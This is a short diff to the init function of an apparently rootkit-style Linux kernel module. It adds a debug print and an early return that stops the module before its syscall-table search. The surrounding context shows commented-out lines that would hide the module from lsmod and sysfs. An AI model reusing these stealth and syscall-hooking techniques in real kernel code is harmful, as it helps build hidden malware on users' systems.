@@ -55,6 +55,8 @@ static int __init r0mod_init(void)
 {
     DEBUG("Module starting...\n");
 
+    printk("HELLO!\n");
+
     //DEBUG("Hiding module object.\n");
     //list_del_init(&__this_module.list);               // Remove from lsmod
     //kobject_del(&THIS_MODULE->mkobj.kobj);            // Remove from FS?
@@ -62,6 +64,8 @@ static int __init r0mod_init(void)
 
     DEBUG("Search Start: %lx\n", SEARCH_START);
     DEBUG("Search End:   %lx\n", SEARCH_END);
+
+    return -1;
 
     if((sct = (void *)find_sct()) == NULL)
         DEBUG("sct == NULL * 1\n");
